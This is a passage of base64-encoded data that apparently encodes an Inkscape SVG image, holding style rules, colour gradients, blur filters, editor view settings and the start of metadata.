zb2xpZDt0ZXh0LWRlY29yYXRpb246bm9uZTt0ZXh0LWluZGVudDowO3RleHQtcmVuZGVyaW5nOmF1dG87dGV4dC10cmFuc2Zvcm06bm9uZTt3aGl0ZS1zcGFjZTpub3JtYWw7d29yZC1zcGFjaW5nOm5vcm1hbDt3cml0aW5nLW1vZGU6bHItdGI7fS5zMjB7ZmlsbDojMTYxNzE3O308L3N0eWxlPjxkZWZzIGlkPSJkZWZzNzQ2NiI+PGxpbmVhckdyYWRpZW50IGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIgeGxpbms6aHJlZj0iI2xpbmVhckdyYWRpZW50Njc3MSIgaWQ9ImxpbmVhckdyYWRpZW50NzEyOSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHgxPSItNDkxLjIiIHkxPSItNjAzLjMiIHgyPSItNDkzLjEiIHkyPSItNTI2IiBncmFkaWVudFRyYW5zZm9ybT0idHJhbnNsYXRlKDgzOC43MjAzNSw4OTkuODE1NTMpIi8+PGxpbmVhckdyYWRpZW50IGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIgaWQ9ImxpbmVhckdyYWRpZW50Njc3MSI+PHN0b3Agb2Zmc2V0PSIwIiBpZD0ic3RvcDY3NzMiIHN0eWxlPSJzdG9wLWNvbG9yOiNjNGM1YzQ7c3RvcC1vcGFjaXR5OjEiLz48c3RvcCBvZmZzZXQ9IjEiIGlkPSJzdG9wNjc3NSIgc3R5bGU9InN0b3AtY29sb3I6I2M0YzVjNDtzdG9wLW9wYWNpdHk6MCIvPjwvbGluZWFyR3JhZGllbnQ+PGxpbmVhckdyYWRpZW50IGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIgeGxpbms6aHJlZj0iI2xpbmVhckdyYWRpZW50NjQ3NSIgaWQ9ImxpbmVhckdyYWRpZW50NzEyNyIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIGdyYWRpZW50VHJhbnNmb3JtPSJ0cmFuc2xhdGUoMCwtMC42MzYyNTI4NSkiIHgxPSItNTI0LjIiIHkxPSItNjA1LjMiIHgyPSItNTI0LjMiIHkyPSItNjI3LjEiLz48bGluZWFyR3JhZGllbnQgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIiBpZD0ibGluZWFyR3JhZGllbnQ2NDc1Ij48c3RvcCBvZmZzZXQ9IjAiIGlkPSJzdG9wNjQ3NyIgc3R5bGU9InN0b3AtY29sb3I6IzJmMzUzNTtzdG9wLW9wYWNpdHk6MSIvPjxzdG9wIGlkPSJzdG9wNjQ4NyIgb2Zmc2V0PSIwLjUiIHN0eWxlPSJzdG9wLWNvbG9yOiMxNzFiMWQ7c3RvcC1vcGFjaXR5OjEiLz48c3RvcCBvZmZzZXQ9IjEiIGlkPSJzdG9wNjQ3OSIgc3R5bGU9InN0b3AtY29sb3I6IzAwMDAwMDtzdG9wLW9wYWNpdHk6MSIvPjwvbGluZWFyR3JhZGllbnQ+PGxpbmVhckdyYWRpZW50IGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIgeGxpbms6aHJlZj0iI2xpbmVhckdyYWRpZW50NjQ3NSIgaWQ9ImxpbmVhckdyYWRpZW50NzEyNSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMCwxLC0xLDAsLTU0MS40NjYxNSw5MzguNTg2ODEpIiB4MT0iLTcxNy40IiB5MT0iLTY3MC45IiB4Mj0iLTc3MC4zIiB5Mj0iLTY3MC45Ii8+PGxpbmVhckdyYWRpZW50IGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIgeGxpbms6aHJlZj0iI2xpbmVhckdyYWRpZW50NjQ3NSIgaWQ9ImxpbmVhckdyYWRpZW50NzEyMyIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMCwtMSwtMSwwLC01NDEuNDY2MTUsLTQ4MC4zNzEwNykiIHgxPSItNzc0LjgiIHkxPSItNjcxLjIiIHgyPSItNzE2LjkiIHkyPSItNjcxLjUiLz48bGluZWFyR3JhZGllbnQgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIiB4bGluazpocmVmPSIjbGluZWFyR3JhZGllbnQ2NDc1IiBpZD0ibGluZWFyR3JhZGllbnQ3MTIxIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgZ3JhZGllbnRUcmFuc2Zvcm09Im1hdHJpeCgtMSwwLDAsMSwtNTgwLjIzNzQ1LDg5OS44MTU1MykiIHgxPSItNzQ3LjgiIHkxPSItNjQ4LjkiIHgyPSItNzQ3IiB5Mj0iLTY5OS4yIi8+PGxpbmVhckdyYWRpZW50IGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIgeGxpbms6aHJlZj0iI2xpbmVhckdyYWRpZW50NjI5NyIgaWQ9ImxpbmVhckdyYWRpZW50NzExOSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHgxPSItNjM0LjYiIHkxPSItNjY5LjIiIHgyPSItNjI0LjQiIHkyPSItNjY5LjMiLz48bGluZWFyR3JhZGllbnQgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIiBpZD0ibGluZWFyR3JhZGllbnQ2Mjk3Ij48c3RvcCBvZmZzZXQ9IjAiIGlkPSJzdG9wNjI5OSIgY2xhc3M9InMwIi8+PHN0b3Agb2Zmc2V0PSIxIiBpZD0ic3RvcDYzMDEiIGNsYXNzPSJzMSIvPjwvbGluZWFyR3JhZGllbnQ+PGxpbmVhckdyYWRpZW50IGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIgeGxpbms6aHJlZj0iI2xpbmVhckdyYWRpZW50NjI5NyIgaWQ9ImxpbmVhckdyYWRpZW50NzExNyIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHgxPSItNjM1LjQiIHkxPSItNjc2LjMiIHgyPSItNjM3LjUiIHkyPSItNjYwLjIiLz48bGluZWFyR3JhZGllbnQgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIiB4bGluazpocmVmPSIjbGluZWFyR3JhZGllbnQ2NDc1IiBpZD0ibGluZWFyR3JhZGllbnQ3MTE1IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9Ii01NDIuMyIgeTE9Ii02OTMuMiIgeDI9Ii01NDIuOCIgeTI9Ii03OTUiLz48bGluZWFyR3JhZGllbnQgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIiB4bGluazpocmVmPSIjbGluZWFyR3JhZGllbnQ2Mjk3IiBpZD0ibGluZWFyR3JhZGllbnQ3MTEzIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9Ii02MzQuNiIgeTE9Ii02NjkuMiIgeDI9Ii02MzkuMyIgeTI9Ii02NjkuMSIvPjxsaW5lYXJHcmFkaWVudCBpbmtzY2FwZTpjb2xsZWN0PSJhbHdheXMiIHhsaW5rOmhyZWY9IiNsaW5lYXJHcmFkaWVudDYzNzciIGlkPSJsaW5lYXJHcmFkaWVudDcxMTEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiB4MT0iLTYzNS40IiB5MT0iLTY3Ni4zIiB4Mj0iLTYzNy41IiB5Mj0iLTY2MC4yIi8+PGxpbmVhckdyYWRpZW50IGlkPSJsaW5lYXJHcmFkaWVudDYzNzciIGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyI+PHN0b3AgaWQ9InN0b3A2Mzc5IiBvZmZzZXQ9IjAiIGNsYXNzPSJzMCIvPjxzdG9wIG9mZnNldD0iMC4yIiBpZD0ic3RvcDYzODMiIHN0eWxlPSJzdG9wLWNvbG9yOiM3ZDgwN2Y7c3RvcC1vcGFjaXR5OjEiLz48c3RvcCBpZD0ic3RvcDYzODEiIG9mZnNldD0iMSIgY2xhc3M9InMxIi8+PC9saW5lYXJHcmFkaWVudD48bGluZWFyR3JhZGllbnQgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIiB4bGluazpocmVmPSIjbGluZWFyR3JhZGllbnQ2NDc1IiBpZD0ibGluZWFyR3JhZGllbnQ3MTA5IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9Ii03NDcuOCIgeTE9Ii02NDguOSIgeDI9Ii03NDciIHkyPSItNjk5LjIiIGdyYWRpZW50VHJhbnNmb3JtPSJ0cmFuc2xhdGUoODM4LjcyMDM1LDg5OS44MTU1MykiLz48bGluZWFyR3JhZGllbnQgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIiB4bGluazpocmVmPSIjbGluZWFyR3JhZGllbnQ2MzQ5IiBpZD0ibGluZWFyR3JhZGllbnQ3MTA3IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9Ii03MDQiIHkxPSItNTgyLjciIHgyPSItNzA3LjIiIHkyPSItNzY5LjIiIGdyYWRpZW50VHJhbnNmb3JtPSJ0cmFuc2xhdGUoODM4LjcyMDM1LDg5OS44MTU1MykiLz48bGluZWFyR3JhZGllbnQgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIiBpZD0ibGluZWFyR3JhZGllbnQ2MzQ5Ij48c3RvcCBvZmZzZXQ9IjAiIGlkPSJzdG9wNjM1MSIgc3R5bGU9InN0b3AtY29sb3I6I2MwYzJjMjtzdG9wLW9wYWNpdHk6MCIvPjxzdG9wIGlkPSJzdG9wNjM2OSIgb2Zmc2V0PSIwLjEiIHN0eWxlPSJzdG9wLWNvbG9yOiM4Mjg1ODQ7c3RvcC1vcGFjaXR5OjAiLz48c3RvcCBpZD0ic3RvcDYzNTciIG9mZnNldD0iMC40IiBzdHlsZT0ic3RvcC1jb2xvcjojNzk3OTc5O3N0b3Atb3BhY2l0eTowIi8+PHN0b3Agb2Zmc2V0PSIwLjUiIGlkPSJzdG9wNjM1OSIgc3R5bGU9InN0b3AtY29sb3I6IzgyODY4MjtzdG9wLW9wYWNpdHk6MCIvPjxzdG9wIGlkPSJzdG9wNjM2NyIgb2Zmc2V0PSIwLjkiIHN0eWxlPSJzdG9wLWNvbG9yOiM4YThhOGE7c3RvcC1vcGFjaXR5OjEiLz48c3RvcCBvZmZzZXQ9IjEiIGlkPSJzdG9wNjM1MyIgc3R5bGU9InN0b3AtY29sb3I6IzlhOWQ5YztzdG9wLW9wYWNpdHk6MSIvPjwvbGluZWFyR3JhZGllbnQ+PGxpbmVhckdyYWRpZW50IGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIgeGxpbms6aHJlZj0iI2xpbmVhckdyYWRpZW50NjQ3NSIgaWQ9ImxpbmVhckdyYWRpZW50NzEwNSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHgxPSItMTYxLjUiIHkxPSItNjQ2LjMiIHgyPSItMTYxLjgiIHkyPSItNjk0LjciLz48bGluZWFyR3JhZGllbnQgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIiB4bGluazpocmVmPSIjbGluZWFyR3JhZGllbnQ2NDc1IiBpZD0ibGluZWFyR3JhZGllbnQ3MTAzIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjcxMC40IiB5MT0iLTIyNCIgeDI9Ijc1NC42IiB5Mj0iLTIyNCIvPjxsaW5lYXJHcmFkaWVudCBpbmtzY2FwZTpjb2xsZWN0PSJhbHdheXMiIHhsaW5rOmhyZWY9IiNsaW5lYXJHcmFkaWVudDY0NzUiIGlkPSJsaW5lYXJHcmFkaWVudDcxMDEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiB4MT0iLTI4Ny42IiB5MT0iLTY0Ny44IiB4Mj0iLTI4Ni45IiB5Mj0iLTY5MS40Ii8+PGxpbmVhckdyYWRpZW50IGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIgeGxpbms6aHJlZj0iI2xpbmVhckdyYWRpZW50NjQ3NSIgaWQ9ImxpbmVhckdyYWRpZW50NzA5OSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHgxPSI1ODUuMSIgeTE9Ii0yMjQiIHgyPSI2MjkuMyIgeTI9Ii0yMjQiLz48bGluZWFyR3JhZGllbnQgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIiB4bGluazpocmVmPSIjbGluZWFyR3JhZGllbnQ2MzQ5IiBpZD0ibGluZWFyR3JhZGllbnQ3MDk3IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgZ3JhZGllbnRUcmFuc2Zvcm09InRyYW5zbGF0ZSgxMzIzLjExMzQsOTA0LjcwOTgyKSIgeDE9Ii03MDQiIHkxPSItNTgyLjciIHgyPSItNzA4LjQiIHkyPSItNzcxLjciLz48bGluZWFyR3JhZGllbnQgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIiB4bGluazpocmVmPSIjbGluZWFyR3JhZGllbnQ0NTUyIiBpZD0ibGluZWFyR3JhZGllbnQ3MDkzIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgZ3JhZGllbnRUcmFuc2Zvcm09InRyYW5zbGF0ZSg3NjUuNzI3NTksMC45NTQzNzkyNykiIHgxPSItNzAyIiB5MT0iLTgwNi4xIiB4Mj0iLTcwOC4xIiB5Mj0iLTc2NiIvPjxsaW5lYXJHcmFkaWVudCBpbmtzY2FwZTpjb2xsZWN0PSJhbHdheXMiIGlkPSJsaW5lYXJHcmFkaWVudDQ1NTIiPjxzdG9wIG9mZnNldD0iMCIgaWQ9InN0b3A0NTU0IiBzdHlsZT0ic3RvcC1jb2xvcjojZjlmOWY5O3N0b3Atb3BhY2l0eToxIi8+PHN0b3Agb2Zmc2V0PSIxIiBpZD0ic3RvcDQ1NTYiIHN0eWxlPSJzdG9wLWNvbG9yOiNmOWY5Zjk7c3RvcC1vcGFjaXR5OjAiLz48L2xpbmVhckdyYWRpZW50PjxsaW5lYXJHcmFkaWVudCBpbmtzY2FwZTpjb2xsZWN0PSJhbHdheXMiIHhsaW5rOmhyZWY9IiNsaW5lYXJHcmFkaWVudDQ1NTIiIGlkPSJsaW5lYXJHcmFkaWVudDcwOTUiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDAuMjU5NTAzNzksMC45NjMzNzAzNCwtMC45Njg0ODEzMywwLjI1ODEzNDMxLC00MTAuMzIyMzcsMTg0LjI4NDY1KSIgeDE9Ii01NzIuOCIgeTE9Ii03NjMuNiIgeDI9Ii03NjQuMiIgeTI9Ii03MjEuOSIvPjxsaW5lYXJHcmFkaWVudCBpbmtzY2FwZTpjb2xsZWN0PSJhbHdheXMiIHhsaW5rOmhyZWY9IiNsaW5lYXJHcmFkaWVudDY1OTkiIGlkPSJsaW5lYXJHcmFkaWVudDcwOTEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KC0xLDAsMCwxLC05MS45OTUwOTMsODk5LjgxNTUzKSIgeDE9Ii02MTQuNiIgeTE9Ii01ODMuNSIgeDI9Ii04MTkuMiIgeTI9Ii01ODAuNiIvPjxsaW5lYXJHcmFkaWVudCBpZD0ibGluZWFyR3JhZGllbnQ2NTk5IiBpbmtzY2FwZTpjb2xsZWN0PSJhbHdheXMiPjxzdG9wIGlkPSJzdG9wNjYwMSIgb2Zmc2V0PSIwIiBjbGFzcz0iczIiLz48c3RvcCBvZmZzZXQ9IjAuNCIgaWQ9InN0b3A2NjAzIiBjbGFzcz0iczMiLz48c3RvcCBpZD0ic3RvcDY2MDUiIG9mZnNldD0iMSIgY2xhc3M9InM0Ii8+PC9saW5lYXJHcmFkaWVudD48bGluZWFyR3JhZGllbnQgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIiB4bGluazpocmVmPSIjbGluZWFyR3JhZGllbnQ0NTUyIiBpZD0ibGluZWFyR3JhZGllbnQ3MDg5IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgZ3JhZGllbnRUcmFuc2Zvcm09Im1hdHJpeCgwLjI1OTQ4NzU3LDAuOTYyMzExODIsLTAuOTY4NDIwNzksMC4yNTc4NTA2OCwtMzM3LjMwODM1LDEwODMuMDE5NCkiIHgxPSItNTc1LjkiIHkxPSItNzU1LjIiIHgyPSItNzY0LjIiIHkyPSItNzIxLjkiLz48ZmlsdGVyIGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIgaWQ9ImZpbHRlcjY4NDYiIHg9IjAiIHdpZHRoPSIxIiB5PSItMC43IiBoZWlnaHQ9IjIuNCIgY29sb3ItaW50ZXJwb2xhdGlvbi1maWx0ZXJzPSJzUkdCIj48ZmVHYXVzc2lhbkJsdXIgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIiBzdGREZXZpYXRpb249IjAuNiIgaWQ9ImZlR2F1c3NpYW5CbHVyNjg0OCIvPjwvZmlsdGVyPjxsaW5lYXJHcmFkaWVudCBpbmtzY2FwZTpjb2xsZWN0PSJhbHdheXMiIHhsaW5rOmhyZWY9IiNsaW5lYXJHcmFkaWVudDQ1NTIiIGlkPSJsaW5lYXJHcmFkaWVudDcwODciIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBncmFkaWVudFRyYW5zZm9ybT0idHJhbnNsYXRlKDgzOC43MjAzNSw5MDAuNzY5OTEpIiB4MT0iLTcwMiIgeTE9Ii04MDYuMSIgeDI9Ii03MDguMSIgeTI9Ii03NjYiLz48ZmlsdGVyIGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIgaWQ9ImZpbHRlcjY1NTkiIHg9IjAiIHdpZHRoPSIxIiB5PSIwIiBoZWlnaHQ9IjEiIGNvbG9yLWludGVycG9sYXRpb24tZmlsdGVycz0ic1JHQiI+PGZlR2F1c3NpYW5CbHVyIGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIgc3RkRGV2aWF0aW9uPSIwLjIiIGlkPSJmZUdhdXNzaWFuQmx1cjY1NjEiLz48L2ZpbHRlcj48cmFkaWFsR3JhZGllbnQgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIiB4bGluazpocmVmPSIjbGluZWFyR3JhZGllbnQ2NTE5IiBpZD0icmFkaWFsR3JhZGllbnQ3MDg1IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgZ3JhZGllbnRUcmFuc2Zvcm09Im1hdHJpeCgwLjIwODg4NzU0LDAuOTc3OTM5NjcsLTAuODY5NDg3MTEsMC4xODU3MjIxMiwtMTI3Ny4yNTM3LDMxLjMxNjMzNikiIGN4PSItNzA2LjQiIGN5PSItODI2LjIiIGZ4PSItNzA2LjQiIGZ5PSItODI2LjIiIHI9IjU1LjkiLz48bGluZWFyR3JhZGllbnQgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIiBpZD0ibGluZWFyR3JhZGllbnQ2NTE5Ij48c3RvcCBvZmZzZXQ9IjAiIGlkPSJzdG9wNjUyMSIgc3R5bGU9InN0b3AtY29sb3I6I2U0ZTVlNTtzdG9wLW9wYWNpdHk6MSIvPjxzdG9wIG9mZnNldD0iMSIgaWQ9InN0b3A2NTIzIiBzdHlsZT0ic3RvcC1jb2xvcjojZTRlNWU1O3N0b3Atb3BhY2l0eTowIi8+PC9saW5lYXJHcmFkaWVudD48bGluZWFyR3JhZGllbnQgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIiB4bGluazpocmVmPSIjbGluZWFyR3JhZGllbnQ0NTQyIiBpZD0ibGluZWFyR3JhZGllbnQ3MDgzIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgZ3JhZGllbnRUcmFuc2Zvcm09Im1hdHJpeCgxLDAsMCwxLjQ0NzAyNzksODQwLjk0NzIzLDEyMzguOTcwNikiIHgxPSItNDkwLjgiIHkxPSItNzg5LjQiIHgyPSItNDkwLjgiIHkyPSItNzYwLjUiLz48bGluZWFyR3JhZGllbnQgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIiBpZD0ibGluZWFyR3JhZGllbnQ0NTQyIj48c3RvcCBvZmZzZXQ9IjAiIGlkPSJzdG9wNDYxNCIgc3R5bGU9InN0b3AtY29sb3I6I2ZmZmZmZjtzdG9wLW9wYWNpdHk6MSIvPjxzdG9wIG9mZnNldD0iMSIgaWQ9InN0b3A0NjE2IiBjbGFzcz0iczQiLz48L2xpbmVhckdyYWRpZW50PjxsaW5lYXJHcmFkaWVudCBpbmtzY2FwZTpjb2xsZWN0PSJhbHdheXMiIHhsaW5rOmhyZWY9IiNsaW5lYXJHcmFkaWVudDY0MjMiIGlkPSJsaW5lYXJHcmFkaWVudDcwODEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiB4MT0iLTYxNC42IiB5MT0iLTU4My41IiB4Mj0iLTgwMi42IiB5Mj0iLTU4NC40IiBncmFkaWVudFRyYW5zZm9ybT0idHJhbnNsYXRlKDgzOC43MjAzNSw4OTkuODE1NTMpIi8+PGxpbmVhckdyYWRpZW50IGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIgaWQ9ImxpbmVhckdyYWRpZW50NjQyMyI+PHN0b3Agb2Zmc2V0PSIwIiBpZD0ic3RvcDY0MjUiIGNsYXNzPSJzMiIvPjxzdG9wIGlkPSJzdG9wNjQzMSIgb2Zmc2V0PSIwLjciIGNsYXNzPSJzMyIvPjxzdG9wIG9mZnNldD0iMSIgaWQ9InN0b3A2NDI3IiBjbGFzcz0iczQiLz48L2xpbmVhckdyYWRpZW50PjxyYWRpYWxHcmFkaWVudCBpbmtzY2FwZTpjb2xsZWN0PSJhbHdheXMiIHhsaW5rOmhyZWY9IiNsaW5lYXJHcmFkaWVudDY2NTEiIGlkPSJyYWRpYWxHcmFkaWVudDcwNzkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KC0xLjE3MjUzNzYsMS41ODY1MzUxLC0xLjM1NjgyMzYsLTEuMDAyNzY3OSwtMTU5Ny41MDE2LDY4My4wMzY2NikiIGN4PSItNzA2LjgiIGN5PSItNjY4LjEiIGZ4PSItNzA2LjgiIGZ5PSItNjY4LjEiIHI9IjEyNS42Ii8+PGxpbmVhckdyYWRpZW50IGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIgaWQ9ImxpbmVhckdyYWRpZW50NjY1MSI+PHN0b3Agb2Zmc2V0PSIwIiBpZD0ic3RvcDY2NTMiIHN0eWxlPSJzdG9wLWNvbG9yOiMyYzJlMmQ7c3RvcC1vcGFjaXR5OjEiLz48c3RvcCBvZmZzZXQ9IjEiIGlkPSJzdG9wNjY1NSIgc3R5bGU9InN0b3AtY29sb3I6IzkyOTY5NTtzdG9wLW9wYWNpdHk6MCIvPjwvbGluZWFyR3JhZGllbnQ+PGZpbHRlciBpbmtzY2FwZTpjb2xsZWN0PSJhbHdheXMiIGlkPSJmaWx0ZXI2NzA3IiB4PSIwIiB3aWR0aD0iMSIgeT0iMCIgaGVpZ2h0PSIxIiBjb2xvci1pbnRlcnBvbGF0aW9uLWZpbHRlcnM9InNSR0IiPjxmZUdhdXNzaWFuQmx1ciBpbmtzY2FwZTpjb2xsZWN0PSJhbHdheXMiIHN0ZERldmlhdGlvbj0iMS4yIiBpZD0iZmVHYXVzc2lhbkJsdXI2NzA5Ii8+PC9maWx0ZXI+PHJhZGlhbEdyYWRpZW50IGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIgeGxpbms6aHJlZj0iI2xpbmVhckdyYWRpZW50NjY1MSIgaWQ9InJhZGlhbEdyYWRpZW50NzA3NyIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoLTEuMzgxNjE3OCwxLjI4NDkwMjIsLTEuMTk5NTE0LC0xLjI4OTgwMjMsLTI0NzguODg5OCwtNjIxLjcyODIzKSIgY3g9Ii03MDYuOCIgY3k9Ii02NjguMSIgZng9Ii03MDYuOCIgZnk9Ii02NjguMSIgcj0iMTI1LjYiLz48bGluZWFyR3JhZGllbnQgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIiB4bGluazpocmVmPSIjbGluZWFyR3JhZGllbnQ0NTQyIiBpZD0ibGluZWFyR3JhZGllbnQ3MDc1IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgZ3JhZGllbnRUcmFuc2Zvcm09Im1hdHJpeCgwLjcwMjgwNDkzLDAsMCwtMS45NDg4NDU2LDY4OS42MDQwNiwtMTE4Ni41Njc2KSIgeDE9Ii00OTAuOCIgeTE9Ii03NzYuMyIgeDI9Ii00OTAuOCIgeTI9Ii03NjAuNSIvPjxyYWRpYWxHcmFkaWVudCBpbmtzY2FwZTpjb2xsZWN0PSJhbHdheXMiIHhsaW5rOmhyZWY9IiNsaW5lYXJHcmFkaWVudDY3MjkiIGlkPSJyYWRpYWxHcmFkaWVudDcwNzMiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDAuOTcyMDY2MywwLjAyMjU4NDA2LC0wLjAxNjgxODcxLDAuNzIzOTA5NzUsNzQ1LjQ1MzgsMzYyLjI0NTI5KSIgY3g9Ii0zODAuNiIgY3k9IjIyMy4yIiBmeD0iLTM4MC42IiBmeT0iMjIzLjIiIHI9IjMyMS4yIi8+PGxpbmVhckdyYWRpZW50IGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIgaWQ9ImxpbmVhckdyYWRpZW50NjcyOSI+PHN0b3Agb2Zmc2V0PSIwIiBpZD0ic3RvcDY3MzEiIHN0eWxlPSJzdG9wLWNvbG9yOiMxYTFjMWE7c3RvcC1vcGFjaXR5OjEiLz48c3RvcCBvZmZzZXQ9IjEiIGlkPSJzdG9wNjczMyIgc3R5bGU9InN0b3AtY29sb3I6IzJjMmUyZDtzdG9wLW9wYWNpdHk6MCIvPjwvbGluZWFyR3JhZGllbnQ+PGxpbmVhckdyYWRpZW50IGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIgeGxpbms6aHJlZj0iI2xpbmVhckdyYWRpZW50Njg1MCIgaWQ9ImxpbmVhckdyYWRpZW50NzA3MSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMS4wNTY4NzQxLDAsMCwtMS45NDg4NDU2LDg1Ni4wNDM4OSwtMTM2NC43MzI5KSIgeDE9Ii00OTAuNSIgeTE9Ii03ODAuMSIgeDI9Ii00OTAuNSIgeTI9Ii03NTYuNiIvPjxsaW5lYXJHcmFkaWVudCBpZD0ibGluZWFyR3JhZGllbnQ2ODUwIiBpbmtzY2FwZTpjb2xsZWN0PSJhbHdheXMiPjxzdG9wIGlkPSJzdG9wNjg1MiIgb2Zmc2V0PSIwIiBjbGFzcz0iczQiLz48c3RvcCBpZD0ic3RvcDY4NTQiIG9mZnNldD0iMSIgc3R5bGU9InN0b3AtY29sb3I6IzdhN2Y3ZTtzdG9wLW9wYWNpdHk6MSIvPjwvbGluZWFyR3JhZGllbnQ+PHJhZGlhbEdyYWRpZW50IGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIgeGxpbms6aHJlZj0iI2xpbmVhckdyYWRpZW50NjUxOSIgaWQ9InJhZGlhbEdyYWRpZW50NzA2OSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMC4yMDg4ODc1NCwwLjk3NzkzOTY3LC0wLjg2OTQ4NzExLDAuMTg1NzIyMTIsLTEyNzcuMjUzNywzMS4zMTYzMzYpIiBjeD0iLTcwNi40IiBjeT0iLTgyNi4yIiBmeD0iLTcwNi40IiBmeT0iLTgyNi4yIiByPSI1NS45Ii8+PC9kZWZzPjxzb2RpcG9kaTpuYW1lZHZpZXcgaWQ9ImJhc2UiIHBhZ2Vjb2xvcj0iI2ZmZmZmZiIgYm9yZGVyY29sb3I9IiM2NjY2NjYiIGJvcmRlcm9wYWNpdHk9IjEiIGlua3NjYXBlOnBhZ2VvcGFjaXR5PSIwIiBpbmtzY2FwZTpwYWdlc2hhZG93PSIyIiBpbmtzY2FwZTp6b29tPSIxIiBpbmtzY2FwZTpjeD0iNDAxLjMiIGlua3NjYXBlOmN5PSIxOTUuNiIgaW5rc2NhcGU6ZG9jdW1lbnQtdW5pdHM9InB4IiBpbmtzY2FwZTpjdXJyZW50LWxheWVyPSJnODQ2NyIgc2hvd2dyaWQ9ImZhbHNlIiBpbmtzY2FwZTp3aW5kb3ctd2lkdGg9IjE2MTUiIGlua3NjYXBlOndpbmRvdy1oZWlnaHQ9IjEwMjYiIGlua3NjYXBlOndpbmRvdy14PSI2NSIgaW5rc2NhcGU6d2luZG93LXk9IjI0IiBpbmtzY2FwZTp3aW5kb3ctbWF4aW1pemVkPSIxIi8+PG1ldGFkYXRhIGlkPSJtZXRhZGF0YTc0NjkiPjxyZGY6UkRGPjxjYzpXb3JrIHJkZjphYm91dD0iIj48ZGM6Zm9ybWF0PmltYWdlL3